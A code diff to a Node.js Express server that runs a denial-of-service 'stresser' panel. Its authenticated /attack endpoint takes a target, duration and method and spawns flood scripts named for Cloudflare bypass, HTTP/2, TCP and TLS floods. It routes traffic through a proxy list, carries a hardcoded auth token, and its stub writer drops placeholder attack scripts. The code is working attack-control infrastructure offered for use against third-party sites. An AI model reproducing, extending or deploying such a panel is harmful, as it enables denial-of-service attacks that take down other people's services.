@@ -9,8 +9,11 @@ const path = require('path');
 const app = express();
 app.use(express.json());
 
+// [FIX] Tell Express to trust the proxy (required for rate limiting on Render)
+app.set('trust proxy', 1);
+
 const port = process.env.PORT || 5553;
-const AUTH_TOKEN = 'bold';
+const AUTH_TOKEN = "ricardo";
 
 // Rate limiting
 const limiter = rateLimit({
@@ -137,12 +140,11 @@ function getMethodFilename(method) {
   return method.toLowerCase().replace(/[\s.]+/g, '-');
 }
 
-// Universal command runner (supports .exe, .cs via dotnet, .js)
+// Universal command runner (supports .exe and .js; no .cs)
 function runAttackCommand(method, target, time, additionalArgs = [], callback = () => {}) {
   const baseName = getMethodFilename(method);
   const methodsDir = path.join(__dirname, 'methods');
   const exePath = path.join(methodsDir, `${baseName}.exe`);
-  const csPath = path.join(methodsDir, `${baseName}.cs`);
   const jsPath = path.join(methodsDir, `${baseName}.js`);
 
   let command, argsList;
@@ -150,19 +152,15 @@ function runAttackCommand(method, target, time, additionalArgs = [], callback = 
   if (fs.existsSync(exePath)) {
     command = exePath;
     argsList = [target, time.toString(), ...additionalArgs];
-    console.log(`[SERVER-EXEC] C# EXE: ${command} ${argsList.join(' ')}`);
-  } else if (fs.existsSync(csPath)) {
-    command = 'dotnet';
-    argsList = ['run', csPath, target, time.toString(), ...additionalArgs];
-    console.log(`[SERVER-EXEC] C# SCRIPT: dotnet run ${csPath} ${target} ${time}`);
+    console.log(`[SERVER-EXEC] EXE: ${command} ${argsList.join(' ')}`);
   } else if (fs.existsSync(jsPath)) {
     command = 'node';
     argsList = [jsPath, target, time.toString(), ...additionalArgs];
     console.log(`[SERVER-EXEC] Node.js: ${command} ${argsList.join(' ')}`);
   } else {
-    console.error(`[ERROR] No executable found for method: ${method} (tried .exe, .cs, .js)`);
+    console.error(`[ERROR] No executable found for method: ${method} (tried .exe, .js)`);
     callback(new Error(`No executable for ${method}`));
-    return;
+    return null;
   }
 
   const proc = spawn(command, argsList, { detached: true, stdio: 'pipe' });
@@ -180,7 +178,7 @@ function runAttackCommand(method, target, time, additionalArgs = [], callback = 
   return proc;
 }
 
-// Ensure methods directory and create stubs for missing files
+// Ensure methods directory and create missing stub scripts (Node.js only)
 function ensureMethodScripts() {
   const methodsDir = path.join(__dirname, 'methods');
   if (!fs.existsSync(methodsDir)) fs.mkdirSync(methodsDir, { recursive: true });
@@ -193,39 +191,21 @@ function ensureMethodScripts() {
     }
   };
 
-  // C# stub (for methods that might be missing)
-  const csStub = (name) => `using System;
-class ${name} {
-    static void Main(string[] args) {
-        Console.WriteLine("[${name.ToUpper()}] Starting attack (stub)");
-        int time = args.Length > 1 ? int.Parse(args[1]) : 60;
-        System.Threading.Thread.Sleep(time * 1000);
-        Console.WriteLine("[${name.ToUpper()}] Attack complete");
-    }
-}`;
-
-  // Node.js stub
+  // Node.js stub for missing methods
   const jsStub = (name) => `console.log('[${name.toUpperCase()}] Starting attack'); const target = process.argv[2]; const time = parseInt(process.argv[3]) || 60; setTimeout(() => process.exit(0), time * 1000);`;
-
-  // List of expected method files (C# and Node.js)
-  const csMethods = [
-    'BYPASS', 'R-GOST', 'REX-COSTUM', 'browsersun', 'cf-bypass', 'cibi',
-    'h2-nust', 'h2ca', 'high-dstat', 'http-panel', 'kbrowser', 'modern-flood', 'raw-get'
-  ];
-  for (const m of csMethods) {
-    writeStub(`${m}.cs`, csStub(m));
-  }
 
   const jsMethods = [
     'nust', 'w-flood1', 'vhold', 'uam', 'wil',
     'r10-rapid', 'r10-tcp', 'r10-tls', 'r10-conn', 'r10-header',
-    'r10-frag', 'r10-pipe', 'r10-cookie', 'r10-mixed', 'r10-lowcpu'
+    'r10-frag', 'r10-pipe', 'r10-cookie', 'r10-mixed', 'r10-lowcpu',
+    'BYPASS', 'R-GOST', 'REX-COSTUM', 'browsersun', 'cf-bypass', 'cibi',
+    'h2-nust', 'h2ca', 'high-dstat', 'http-panel', 'kbrowser', 'modern-flood', 'raw-get'
   ];
   for (const m of jsMethods) {
     writeStub(`${m}.js`, jsStub(m));
   }
 
-  // Also create raw-get.js (full version) if not exists – optional, but keep compatibility
+  // Also ensure raw-get.js (full version) exists
   const rawGetJsPath = path.join(methodsDir, 'raw-get.js');
   if (!fs.existsSync(rawGetJsPath)) {
     const rawGetJs = `#!/usr/bin/env node
@@ -393,7 +373,7 @@ app.get('/blocked', authenticate, (req, res) => res.json({ blocked: Array.from(b
 
 app.get('/ping', (req, res) => res.json({ alive: true, timestamp: Date.now(), uptime: process.uptime() }));
 
-// ========== SERVER-SIDE ATTACK ENDPOINT (UPDATED FOR C#) ==========
+// ========== SERVER-SIDE ATTACK ENDPOINT (UPDATED: .exe or .js only) ==========
 app.get('/attack', authenticate, (req, res) => {
   const { target, time, methods } = req.query;
   if (!target || !time || !methods) return res.status(400).json({ error: 'Missing required parameters' });
@@ -422,7 +402,7 @@ app.get('/attack', authenticate, (req, res) => {
     if (proc) activeProcesses.push(proc);
   };
 
-  // Attack definitions (same as bot, using universal runner)
+  // Attack definitions
   switch(methods) {
     case 'RAPID10':
       const r10files = ['r10-rapid', 'r10-tcp', 'r10-tls', 'r10-conn', 'r10-header',
@@ -510,11 +490,11 @@ app.listen(port, () => {
   console.log(`📍 Listening on port ${port}`);
   console.log(`🔑 Auth Token: ${AUTH_TOKEN}`);
   console.log(`📊 Live Stats: ENABLED`);
-  console.log(`🔥 C#/Node.js method support enabled`);
+  console.log(`🔥 Attack methods: .exe or .js (no dotnet required)`);
   console.log('========================================\n');
   
   if (!fs.existsSync('./proxy.txt')) fs.writeFileSync('./proxy.txt', '# Add your proxies here\n# Format: ip:port\n');
   console.log('📁 Required files:');
-  console.log('   - /methods/ - attack scripts (.exe, .cs, .js)');
+  console.log('   - /methods/ - attack scripts (.exe or .js)');
   console.log('   - proxy.txt - add your proxies (one per line)\n');
 });
